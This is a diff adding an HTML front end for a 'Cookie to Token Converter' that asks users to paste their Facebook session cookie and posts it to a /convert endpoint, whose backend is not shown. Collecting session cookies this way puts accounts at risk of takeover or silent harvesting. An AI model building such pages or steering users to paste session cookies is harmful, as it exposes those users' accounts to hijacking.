@@ -1,0 +1,48 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie to Token Converter</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Cookie to Token Converter</h1>
+        <form id="convert-form">
+            <label for="cookie">Paste your cookie here:</label>
+            <textarea id="cookie" name="cookie" placeholder="Enter your Facebook cookie..." required></textarea>
+            <button type="submit">Convert Cookie</button>
+        </form>
+        <div id="result">
+            <h3>Your Token:</h3>
+            <textarea id="token" readonly></textarea>
+        </div>
+    </div>
+    <script>
+        document.getElementById('convert-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const cookie = document.getElementById('cookie').value;
+
+            const response = await fetch('/convert', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ cookie: cookie })
+            });
+
+            const result = document.getElementById('result');
+            const tokenBox = document.getElementById('token');
+            if (response.ok) {
+                const data = await response.json();
+                tokenBox.value = data.token;
+                result.style.display = 'block';
+            } else {
+                const errorData = await response.json();
+                tokenBox.value = errorData.error || "An unknown error occurred.";
+                result.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
